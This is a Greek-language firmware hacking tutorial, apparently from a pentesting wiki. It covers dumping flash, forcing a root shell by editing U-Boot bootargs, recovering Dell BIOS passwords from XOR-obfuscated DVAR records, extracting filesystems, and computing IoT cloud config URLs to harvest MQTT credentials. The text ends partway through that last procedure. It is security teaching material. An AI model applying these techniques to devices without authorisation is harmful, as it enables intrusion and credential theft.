## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική CPU και το λειτουργικό σύστημα που εκτελεί
- Λεπτομέρειες του bootloader
- Διάταξη υλικού και datasheets
- Μετρικές του codebase και τοποθεσίες πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύπους αδειών χρήσης
- Ιστορικό ενημερώσεων και κανονιστικές πιστοποιήσεις
- Αρχιτεκτονικά διαγράμματα και διαγράμματα ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για τον σκοπό αυτό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση τυχόν διαθέσιμων στοιχείων λογισμικού ανοιχτού κώδικα μέσω χειροκίνητων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως το [Coverity Scan](https://scan.coverity.com) και το [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν στατική ανάλυση, η οποία μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με διαφορετικό βαθμό πολυπλοκότητας:

- **Απευθείας** από την πηγή (προγραμματιστές, κατασκευαστές)
- **Δημιουργία** του βάσει των παρεχόμενων οδηγιών
- **Λήψη** από επίσημους ιστότοπους υποστήριξης
- Χρήση ερωτημάτων **Google dork** για τον εντοπισμό φιλοξενούμενων αρχείων firmware
- Άμεση πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλοπή **ενημερώσεων** με τεχνικές man-in-the-middle
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) ή **PICit**
- **Υποκλοπή** αιτημάτων ενημέρωσης κατά την επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded endpoints ενημέρωσης**
- **Απόρριψη** από τον bootloader ή μέσω δικτύου
- **Αφαίρεση και ανάγνωση** του chip αποθήκευσης, όταν αποτύχουν όλα τα άλλα, με χρήση κατάλληλων εργαλείων υλικού

### Καταγραφές μόνο μέσω UART: επιβολή root shell μέσω του U-Boot env στη flash

Αν το UART RX αγνοείται (μόνο καταγραφές), μπορείτε και πάλι να επιβάλετε ένα init shell **επεξεργαζόμενοι offline το U-Boot environment blob**:<sup>[[6]](#references)</sup>

1. Απορρίψτε το SPI flash με ένα κλιπ SOIC-8 και programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Εντοπίστε το partition του U-Boot env, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει το `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο το env partition και επανεκκινήστε· θα πρέπει να εμφανιστεί ένα shell στο UART.

Αυτό είναι χρήσιμο σε embedded συσκευές όπου το shell του bootloader είναι απενεργοποιημένο, αλλά το env partition είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στο flash.

### Αποκάλυψη προστατευμένου κώδικα μέσω μιας εργασίας αντιγραφής του Firewall

Ορισμένα MCU επιτρέπουν σε μη προστατευμένο κώδικα εφαρμογής να καλεί ένα gateway προστατευμένης περιοχής, αντί να διαβάζει απευθείας το προστατευμένο Flash. Αφού αποκτήσετε εκτέλεση κώδικα στην εφαρμογή, εξετάστε κάθε εργασία gateway ως ξεχωριστό primitive μεταφοράς μνήμης. Στην περίπτωση του Cypherock X1, το call gate του STM32L4 Firewall δεχόταν μια εργασία, έναν εξωτερικό δείκτη `data`, ένα μήκος και μια προστατευμένη `address`. Μια εργασία εγγραφής δεν απέρριπτε έναν δείκτη πηγής `data` που έδειχνε μέσα στο Firewall Code. Ο καλών δεν μπορούσε να διαβάσει απευθείας αυτόν τον κώδικα, αλλά το ίδιο το gateway μπορούσε να τον αντιγράψει σε προστατευμένο μη πτητικό αποθηκευτικό χώρο, από τον οποίο μια επιτρεπόμενη εργασία ανάγνωσης τον εξέθετε.<sup>[[15]](#references)</sup>

Για να αναπαράγετε αυτήν την κατηγορία αποκάλυψης, εντοπίστε μια εγγράψιμη σελίδα προστατευμένου αποθηκευτικού χώρου με αντίστοιχη εργασία ανάγνωσης, ορίστε την πηγή εγγραφής σε διαδοχικές διευθύνσεις προστατευμένου κώδικα και διαβάστε τα bytes που αποθηκεύτηκαν προσωρινά. Ελέγξτε το μέσο αποθήκευσης πριν επαναλάβετε τις εγγραφές: στην προκειμένη περίπτωση ήταν Flash, επομένως έπρεπε να διαγραφεί μια σελίδα πριν χρησιμοποιηθεί ξανά. Οι ερευνητές χρησιμοποίησαν μια ρουτίνα που διέγραφε και επανέφερε τα έγκυρα περιεχόμενα του Secure Data Storage και στη συνέχεια αποθήκευαν προσωρινά τον κώδικα στον υπόλοιπο ελεύθερο χώρο, αντί να αντικαταστήσουν δεδομένα του wallet. Αυτό απαιτεί εκτέλεση κώδικα στο MCU και προσβάσιμο call gate· δεν αποτελεί άμεση παράκαμψη ανάγνωσης από μη πιστοποιημένο host.<sup>[[15]](#references)</sup>

Ο ανακτημένος κώδικας μπορεί να αποκαλύψει [κενά εμπιστοσύνης στην ενημέρωση firmware και στην ακεραιότητα της εκκίνησης](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες σχετικά με αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Μερικά εργαλεία που μπορείτε να χρησιμοποιήσετε:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε την **εντροπία** της εικόνας με `binwalk -E <bin>`. Αν η εντροπία είναι χαμηλή, τότε μάλλον δεν είναι κρυπτογραφημένη. Αν είναι υψηλή, πιθανότατα είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

### Ακατέργαστα στοιχεία γραφικών οθόνης σε εξωτερική flash

Ένα εξωτερικό SPI dump δεν είναι απαραίτητα το εκτελέσιμο firmware του MCU. Για έναν στόχο Cortex-M, συγκρίνετε την αρχή κάθε υποψήφιας περιοχής κώδικα με τον χάρτη μνήμης της συσκευής: ένας κανονικός πίνακας διανυσμάτων αρχίζει με μια εύλογη διεύθυνση δείκτη στοίβας SRAM και μια διεύθυνση reset handler σε εκτελέσιμη μνήμη. Η απουσία πίνακα διανυσμάτων στο offset μηδέν από μόνη της δεν αποδεικνύει ότι ολόκληρο το chip δεν περιέχει κώδικα· επιθεωρήστε και άλλα offsets, καθώς και τη διάταξη εκκίνησης. Αν το `binwalk` δεν εντοπίσει κάποιο container, επιθεωρήστε τα ακατέργαστα bytes και συσχετίστε τις διευθύνσεις ανάγνωσης flash με τις ενέργειες που φορτώνουν νέες οθόνες, χρησιμοποιώντας μια [αποκωδικοποιημένη καταγραφή SPI](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer).<sup>[[14]](#references)</sup>

Για μια περιοχή στοιχείων γραφικών οθόνης, δοκιμάστε υποψήφιες μορφές pixel και διαστάσεις, αντί να υποθέσετε ότι πρόκειται για PNG/JPEG. Η συσκευή που αναφέρεται χρησιμοποιούσε καρέ **80×160 RGB565 little-endian**: με δύο bytes ανά pixel, ένα καρέ έχει μέγεθος **25,600 bytes** (25 KiB), όχι 24 kilobits. Μια αποκωδικοποιημένη διεύθυνση ανάγνωσης flash εντόπισε το offset του στοιχείου γραφικών οθόνης· ο ερευνητής μετέτρεψε μια προετοιμασμένη εικόνα με `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, αντικατέστησε το στοιχείο ίδιου μεγέθους στο αρχικό dump, το έγραψε με `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` και επιβεβαίωσε ότι εμφανίστηκε η νέα εικόνα στην οθόνη. Αυτό αποδεικνύει ότι είναι εγγράψιμα τα *εξωτερικά στοιχεία γραφικών οθόνης*, όχι ότι έγινε εξαγωγή ή επανεγγραφή του εσωτερικού firmware του MCU. Διατηρήστε το αρχικό dump και επαληθεύστε τις διαστάσεις, τη σειρά byte, το offset και το μήκος του στοιχείου αντικατάστασης πριν από οποιαδήποτε εγγραφή.<sup>[[14]](#references)</sup>

### Διαφορική ανάλυση flash και ανακτήσιμες αποθήκες μυστικών XOR

Όταν μια ρύθμιση firmware δεν έχει τεκμηριωμένη μορφή αποθήκευσης, αρχικά πραγματοποιήστε αρκετές αντίστοιχες αναγνώσεις flash, αλλάξτε **ακριβώς μία** ρύθμιση, κάντε ξανά dump ολόκληρου του chip και συγκρίνετε τα offsets. Η επανάληψη του πειράματος με ελεγχόμενες τιμές διακρίνει τη ρύθμιση από τους μετρητές και τα μεταδεδομένα εγγραφής· αλλαγές σε νέα offsets αντί για επιτόπου υποδεικνύουν αποθήκευση μόνο με προσθήκη ή με δομή καταγραφής. Διατηρήστε τις διαγραμμένες/σημασμένες ως tombstone εγγραφές, καθώς τα bytes του payload τους μπορεί να παραμένουν ανακτήσιμα.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Αφού εντοπίσετε την περιοχή, εξαγάγετε τα modules του firmware με εργαλεία όπως το `binwalk` και κάντε reverse engineering του writer/validator στο Ghidra. Επιβεβαιώστε στον κώδικα τα όρια των πεδίων, το padding, την ευρετηρίαση του key και την παραγωγή του key, αντί να συμπεραίνετε το scheme μόνο από τα μοτίβα του ciphertext.<sup>[[12]](#references)</sup>

#### Ανάκτηση keys από κρυπτογραφημένο padding μηδενικών

Όπως περιγράφεται στην [κρυπτογράφηση βασισμένη σε XOR](../../crypto/symmetric/#xor-based-encryption), το γνωστό plaintext αποκαλύπτει bytes του keystream στις ίδιες θέσεις. Ένα πεδίο σταθερού μεγέθους είναι ιδιαίτερα εκτεθειμένο όταν το padding μηδενικών του καλύπτει κάθε θέση ενός επαναλαμβανόμενου XOR key: το κρυπτογραφημένο padding αποκαλύπτει απευθείας αυτά τα bytes του key, επειδή `0x00 XOR key_byte = key_byte`. Αν καλύπτονται όλες οι θέσεις του key, ανακατασκευάστε το key από την ουρά του ciphertext και αποκρυπτογραφήστε τα bytes που περιέχουν δεδομένα.<sup>[[12]](#references)</sup>

Η ευάλωτη μορφή κωδικού πρόσβασης BIOS DVAR της Dell είναι ένα συγκεκριμένο παράδειγμα: το byte `0` ενός πεδίου 32 byte είναι σε plaintext, ενώ τα bytes `1..31` χρησιμοποιούν ένα επαναλαμβανόμενο key 20 byte.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Για μήκος κωδικού πρόσβασης `L`, οι θέσεις `L..31` ήταν μηδενικές πριν από το XOR. Όταν `L <= 12`, αυτές οι θέσεις καλύπτουν κάθε δείκτη κλειδιού, οπότε ανακτώνται το πλήρες κλειδί και ο κωδικός πρόσβασης χωρίς brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Ανάκτηση κλειδιών από ιστορικές εγγραφές

Μην αναλύετε κάθε εγγραφή ξεχωριστά. Το κλειδί DVAR προκύπτει περίπου ως `modified_md5(device_seed || variable_GUID || password[0])`: το device seed και το GUID είναι σταθερά, και η μόνη είσοδος που εξαρτάται από τον κωδικό πρόσβασης είναι το πρώτο byte σε καθαρή μορφή. Αυτό δίνει έως 256 κλειδιά ανά συσκευή και σημαίνει ότι οι εγγραφές που αρχίζουν με το ίδιο byte μοιράζονται ένα κλειδί. Ομαδοποιήστε τις ενεργές και διαγραμμένες εγγραφές βάσει αυτού του byte· μια σύντομη ιστορική εγγραφή μπορεί να leak ολόκληρο το κλειδί μέσω του padding και να αποκρυπτογραφήσει μια τρέχουσα, μεγαλύτερη εγγραφή της οποίας το padding δεν επαρκεί. Συνεπώς, η αλλαγή κωδικού πρόσβασης μπορεί να αυξήσει την έκθεση όταν το παλιό ciphertext γίνεται tombstoned αντί να διαγράφεται.<sup>[[12]](#references)</sup>

Το εργαλείο [`dellpwn`](https://github.com/R3n5k1/dellpwn) εντοπίζει το DVAR, επικυρώνει υποψήφιες εγγραφές, ανακτά κωδικούς πρόσβασης και μπορεί να εμφανίσει τα ακατέργαστα αποθηκευμένα bytes/bytes κλειδιού. Δημιουργήστε το από ένα checkout και σαρώστε μια επαληθευμένη εικόνα flash ως εξής:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Για προσαρμοσμένους parsers, απορρίψτε τα false positives χρησιμοποιώντας τη δομή των εγγραφών, περιορισμούς εκτυπώσιμων χαρακτήρων, ελέγχους μηδενικού padding, εντροπία κλειδιού και συνέπεια στα σημεία όπου επαναλαμβάνεται το κλειδί. Αν επαναλαμβανόμενα dumps δείχνουν αραιές αναστροφές bit ανά εγγραφή, καταγράψτε τις μάσκες που παρατηρήθηκαν και κατατάξτε τις διορθώσεις βάσει αυτών των περιορισμών, αλλά αναφέρετε τους αμφίσημους χαρακτήρες αντί να παρουσιάζετε ευρετικά αποτελέσματα ως ακριβή ανάκτηση.<sup>[[12]](#references)</sup>

Οι επαληθευτές κωδικών πρόσβασης θα πρέπει να αποθηκεύουν salted, επαναληπτικά one-way hashes αντί για αναστρέψιμο ciphertext, ενώ τα stores με δομή καταγραφής θα πρέπει να αφαιρούν με ασφάλεια το υλικό μυστικών που έχει αντικατασταθεί.<sup>[[12]](#references)</sup>

### Λήψη του συστήματος αρχείων

Με τα προηγούμενα εργαλεία με σχόλια, όπως το `binwalk -ev <bin>`, θα έπρεπε να έχετε καταφέρει να **εξαγάγετε το σύστημα αρχείων**.\
Το Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο με όνομα τον τύπο του συστήματος αρχείων**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή συστήματος αρχείων

Μερικές φορές, το binwalk **δεν θα έχει τα magic bytes του συστήματος αρχείων στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **εντοπίσετε το offset του συστήματος αρχείων και να απομονώσετε το συμπιεσμένο σύστημα αρχείων** από το binary και, στη συνέχεια, να **εξαγάγετε χειροκίνητα** το σύστημα αρχείων ανάλογα με τον τύπο του, ακολουθώντας τα παρακάτω βήματα.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Εκτελέστε την ακόλουθη **εντολή dd** για να απομονώσετε το σύστημα αρχείων Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Εναλλακτικά, μπορεί να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται έπειτα στον κατάλογο "`squashfs-root`".

- Αρχεία αρχειοθήκης CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ανασύνθεση διαχωρισμένων ενσωματωμένων συστημάτων αρχείων root

Αν ένα raw dump eMMC/SSD περιέχει έγκυρη κεφαλίδα συστήματος αρχείων, αλλά οι μετατοπίσεις των μεταδεδομένων του εκτείνονται πέρα από το ονομαστικό διαμέρισμα, μην το χαρακτηρίσετε αμέσως ως κατεστραμμένο. Ο ενσωματωμένος κώδικας εκκίνησης μπορεί να συνθέτει την πραγματική συσκευή root από πολλαπλές φυσικές περιοχές με το Device Mapper, επομένως το carving ενός διαμερίσματος GPT παράγει μόνο το πρώτο τμήμα.<sup>[[9]](#references)</sup>

#### Αρχική διαλογή της πλήρους εικόνας του μέσου

Πρώτα, επιβεβαιώστε ότι η λήψη έχει ολοκληρωθεί, το μέγεθος είναι σταθερό και κανένα πρόγραμμα εγγραφής δεν έχει πλέον ανοιχτή την εικόνα. Αν το όνομα αρχείου κωδικοποιεί μια διεύθυνση έναρξης/λήξης, συγκρίνετε αυτό το εύρος με τον πραγματικό αριθμό byte. Ανακτήστε το GPT σε λειτουργία μόνο για ανάγνωση και προσαρτήστε μόνο το απαιτούμενο εύρος· **μην** εκτελέσετε `vgchange -ay` σε έναν μη έμπιστο φυσικό τόμο στον σταθμό εργασίας, επειδή είναι πιθανές συγκρούσεις ομάδων τόμων και ακούσιες εγγραφές.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Προτιμήστε μια disposable VM όταν η αρχική λογική init ή μια στοίβα LVM πρέπει να έχει πρόσβαση σε ολόκληρο το image. Τα ιστορικά boot logs από ένα τυπικό boot partition είναι ιδιαίτερα χρήσιμα: ο bootloader μπορεί να έχει καταγράψει offsets proprietary containers, μήκη components, επιλογή slot, κανόνες ευθυγράμμισης και επαλήθευση υπογραφής. Χρησιμοποιήστε αυτές τις τιμές για να απομονώσετε ένα ενσωματωμένο command line/kernel/initramfs και, στη συνέχεια, επικυρώστε κάθε έξοδο ξεχωριστά με `file`, magic bytes και `binwalk`. Η ανάγνωση μέχρι το τέλος του container μπορεί κατά λάθος να προσθέσει στο kernel ένα initrd, ένα αντικείμενο ACPI ή μια υπογραφή.<sup>[[9]](#references)</sup>

#### Ανάκτηση του block map κατά την εκκίνηση

Εξαγάγετε το initramfs του kernel και κάντε reverse engineering στο `/init` και σε τυχόν storage libraries. Στο [Εργαλεία αναστροφής και βασικές μέθοδοι](../../reversing/reversing-tools-basic-methods/), ακολουθήστε τις αναφορές συμβολοσειρών για τα `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` και τις διαδρομές των partitions. Έπειτα, ακολουθήστε τον κώδικα που επιλέγει το ενεργό A/B slot και δημιουργεί τον πίνακα. Χρήσιμα σημεία εκκίνησης στο radare2 είναι τα `r2 -A init`, `afl`, `pdf @ main` και `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ο linear target αντιστοιχίζει διαδοχικές περιοχές μιας εικονικής συσκευής σε περιοχές μίας ή περισσότερων συσκευών υποστήριξης. Ένας πίνακας δύο τμημάτων που έχει ανακτηθεί συχνά έχει την εξής μορφή (όλες οι θέσεις και τα μήκη είναι σε τομείς των 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Αναπαραγάγετε με ακρίβεια τις αριθμητικές πράξεις του machine code, συμπεριλαμβανομένων του πλάτους των ακεραίων, των μετατοπίσεων και των μετατροπών μονάδων. Για παράδειγμα, η ακόλουθη έκφραση στρογγυλοποιεί προς τα κάτω το μέγεθος σε bytes στο πλησιέστερο όριο των 4 KiB και μόνο έπειτα το μετατρέπει σε τομείς των 512 bytes· αν την αντικαταστήσετε με `p4_bytes // 512`, η επιλεγμένη ουρά μετατοπίζεται κατά `p4_bytes % 4096` κάθε φορά που το διαμέρισμα δεν είναι ευθυγραμμισμένο σε όριο σελίδας.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ανακατασκευάστε μια επίπεδη εικόνα ανάλυσης αντιγράφοντας τα εύρη με τη σειρά του πίνακα, σε τμήματα περιορισμένου μεγέθους, αντί να φορτώσετε ολόκληρο το media dump στη μνήμη. Έτσι αποφεύγετε επίσης τη δημιουργία mapper devices στην πλευρά του host. Διατηρήστε τις μετατοπίσεις που προκύπτουν από το GPT, τους αντίστροφους αριθμούς τομέων και το μήκος του τελικού αρχείου ως ξεχωριστές assertions.<sup>[[9]](#references)</sup>

#### Διακρίνετε την αλλοίωση από ένα σταθερό σφάλμα ανακατασκευής

Για το SquashFS, ελέγξτε το magic `hsqs` και αποκωδικοποιήστε το little-endian πεδίο 64 bit `bytes_used` στη μετατόπιση 40 του superblock πριν εκτελέσετε το `unsquashfs`. Αν η εξαγωγή αποτύχει σε αρκετές άσχετες μεταξύ τους δομές, αναζητήστε σε ένα ευρύ παράθυρο γύρω από τις αναμενόμενες θέσεις και απαιτήστε ισχυρές δομικές ενδείξεις: ένα μπλοκ metadata που αποσυμπιέζεται, αρκετές διαδοχικές έγκυρες εγγραφές καταλόγου, εύλογα πεδία inode, ένα root inode συμβατό με τον αριθμό των inode ή έγκυρη δομή integrity metadata. Μία μόνο αντιστοιχία magic δεν αρκεί.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Όταν το ίδιο προσημασμένο delta καθιστά έγκυρες ανεξάρτητες δομές — για παράδειγμα, τα μεταδεδομένα καταλόγου και μια εγγραφή verity — η πιθανότερη αιτία είναι ένα συστηματικό σφάλμα στην αρχή του τμήματος και όχι byte που λείπουν. Επιστρέψτε στην αντίστροφη αριθμητική και αναζητήστε απορριφθέντα υπόλοιπα, ζητήματα προσημασμένων/μη προσημασμένων τιμών, υπερχείλιση ή στρογγυλοποίηση σε όρια τομέων/σελίδων πριν επιχειρήσετε ανάκτηση ορφανών δεδομένων ή τροποποίηση των μεταδεδομένων του filesystem.<sup>[[9]](#references)</sup>

Τέλος, διατηρήστε ξεχωριστά τα όρια προστασίας: οι τόμοι LUKS που είναι σφραγισμένοι με TPM προστατεύουν την εμπιστευτικότητα των δεδομένων, ενώ μια υπογεγραμμένη αντιστοίχιση dm-verity προστατεύει την ακεραιότητα του root filesystem. Ένα software TPM δεν ανακτά ένα κλειδί που έχει σφραγιστεί στο αρχικό φυσικό TPM, και η εκκίνηση ενός τροποποιημένου SquashFS μέσω ενός init μόνο για ερευνητικούς σκοπούς, το οποίο παραλείπει την επαλήθευση verity, δεν πλαστογραφεί την υπογραφή του ούτε παραβιάζει το dm-verity.<sup>[[9]](#references)</sup>

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να αναλυθεί διεξοδικά για να γίνει κατανοητή η δομή του και να εντοπιστούν πιθανές ευπάθειες. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από την εικόνα firmware.

### Εργαλεία αρχικής ανάλυσης

Για επιπλέον εργαλεία ανάλυσης firmware και σχετικό υλικό, δείτε την [ενότητα firmware στα Εργαλεία και πόρους τρίτων](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware).

Παρακάτω παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του δυαδικού αρχείου (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή συμβολοσειρών, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών των partitions και των filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **εντροπία** με `binwalk -E <bin>`. Η χαμηλή εντροπία υποδηλώνει απουσία κρυπτογράφησης, ενώ η υψηλή εντροπία υποδηλώνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για την επιθεώρηση αρχείων.

### Εξαγωγή του συστήματος αρχείων

Με τη χρήση του `binwalk -ev <bin>`, μπορεί συνήθως να εξαχθεί το σύστημα αρχείων, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του συστήματος αρχείων (π.χ., squashfs, ubifs). Ωστόσο, όταν το **binwalk** αποτυγχάνει να αναγνωρίσει τον τύπο του συστήματος αρχείων λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό της μετατόπισης του συστήματος αρχείων και, στη συνέχεια, της εντολής `dd` για την εξαγωγή του συστήματος αρχείων:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Έπειτα, ανάλογα με τον τύπο του συστήματος αρχείων (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή των περιεχομένων.

### Ανάλυση συστήματος αρχείων

Αφού εξαχθεί το σύστημα αρχείων, αρχίζει η αναζήτηση για κενά ασφαλείας. Εξετάζονται μη ασφαλείς network daemons, hardcoded διαπιστευτήρια, API endpoints, λειτουργίες server ενημερώσεων, μη μεταγλωττισμένος κώδικας, scripts εκκίνησης και μεταγλωττισμένα binaries για offline ανάλυση.

**Βασικές τοποθεσίες** και **στοιχεία** προς έλεγχο περιλαμβάνουν:

- **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά και κλειδιά SSL στο **etc/ssl**
- Αρχεία διαμόρφωσης και scripts για πιθανά κενά ασφαλείας
- Embedded binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Διάφορα εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και κενών ασφαλείας μέσα στο σύστημα αρχείων:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Έλεγχοι ασφαλείας σε μεταγλωττισμένα binaries

Τόσο ο πηγαίος κώδικας όσο και τα μεταγλωττισμένα binaries που βρίσκονται στο σύστημα αρχείων πρέπει να ελέγχονται προσεκτικά για κενά ασφαλείας. Εργαλεία όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να αποτελέσουν αντικείμενο εκμετάλλευσης.

## Συλλογή cloud config και διαπιστευτηρίων MQTT μέσω token URL που προκύπτουν από υπολογισμό

Πολλοί IoT hubs ανακτούν τη διαμόρφωση κάθε συσκευής από ένα cloud endpoint που έχει τη μορφή:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID με τη χρήση ενός hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως hex με κεφαλαία γράμματα

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να ανακτήσει τη cloud config, αποκαλύπτοντας συχνά plaintext διαπιστευτήρια MQTT και προθέματα topic.

Πρακτική διαδικασία:

1) Εξαγωγή του deviceId από τα UART boot logs

- Συνδέστε έναν προσαρμογέα UART 3.3V (TX/RX/GND) και καταγράψτε τα logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Αναζητήστε γραμμές που εμφανίζουν το μοτίβο URL του cloud config και τη διεύθυνση broker, για παράδειγμα:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

